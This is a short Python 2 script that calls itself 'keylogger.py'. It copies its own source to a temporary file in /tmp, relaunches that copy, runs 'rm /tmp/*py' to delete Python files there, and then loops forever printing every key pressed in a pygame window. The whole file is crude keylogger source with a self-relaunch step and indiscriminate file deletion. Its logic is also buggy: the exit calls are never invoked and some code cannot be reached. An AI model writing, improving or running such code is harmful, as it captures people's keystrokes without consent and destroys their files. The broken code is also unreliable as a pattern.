import tempfile, os, sys, subprocess, pygame
from pygame import *

def get_pygame_data():
    keys = pygame.key.get_pressed()
    return [k for k, v in enumerate(keys) if v]

filenames = os.listdir("/tmp/")
file_running = os.path.dirname(os.path.realpath(__file__))

#print filenames
for filename in filenames:
    if filename.endswith(".py"):
        exists = 0
        run = 1
        break
    else:
        exists = 1
if exists == 1:
    # Create the temp file
    tmpfile = tempfile.NamedTemporaryFile(suffix=".py",delete=False)
    path_tmp = tmpfile.name
    current_file = os.getcwd()+ "/keylogger.py"
    
    # Opens reads the two files
    file_read_ori = open(current_file,"r")
    file_new = open(path_tmp,"w")
    
    # Copy contents over
    contents = file_read_ori.read()
    file_new.write(contents)
    subprocess.Popen(["python2", path_tmp])
else:
    os.system("rm /tmp/*py")
    sys.exit
    print "File exists"
    for filename in filenames:
        #get tmp file name        
        if filename.endswith(".py"):
            path_tmp = "/tmp/" + filename
            file_running = os.path.dirname(os.path.realpath(__file__)) + "/" + filename
            break
            
if file_running != path_tmp:
    exit

else:
    pygame.init()
    screen = pygame.display.set_mode( (100,100) )
    pygame.display.set_caption('PY')
    screen.fill((159, 182, 205))
    
    finished = False
    while not finished:
        pygame.event.pump()
        pressed = get_pygame_data()
        keys_pressed = []
        for k in pressed:
            keys_pressed.append(pygame.key.name(k))
            print keys_pressed
        sys.stdout.flush()
